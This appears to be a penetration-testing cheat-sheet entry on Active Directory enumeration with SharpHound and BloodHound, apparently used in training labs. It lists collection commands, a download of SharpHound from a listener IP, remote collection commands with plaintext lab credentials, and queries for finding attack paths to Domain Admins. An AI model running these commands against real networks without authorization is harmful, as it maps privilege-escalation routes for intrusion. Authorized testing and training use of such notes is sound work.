---
title: SharpHound - Data Collection
category: ad
subcategory: ad-enum
os: windows, linux
command: Invoke-BloodHound -CollectionMethod All
tools: SharpHound
---


### From PowerShell

```powershell
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\L.Livingstone\Documents\ -OutputPrefix "corp audit"
```

### EXE variant

```cmd
.\SharpHound.exe --CollectionMethods All --Domain resourced.local --ExcludeDCs --OutputPrefix "Dork"
```

### Copy SharpHound from Kali

```bash
cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 SH.ps1
iwr -uri http://192.168.119.5:8000/SharpHound.ps1 -Outfile SharpHound.ps1
```

### Remote collection from Kali (no need to drop binaries)

```bash
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.208.40
bloodhound-python -u enox -p california -ns 192.168.81.165 -d heist.offsec -c all
```

### Ingest with NetExec

```bash
netexec ldap $target -u SQLService -p 'MYpassword123#' --bloodhound --collection All --dns-server $target
```

### Useful raw cypher queries

```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

### Pre-built useful queries

- Find all Domain Admins
- Find Workstations where Domain Users can RDP
- Find Servers where Domain Users can RDP
- Find Computers where Domain Users are Local Admin
- Shortest Path to Domain Admins from Owned Principals
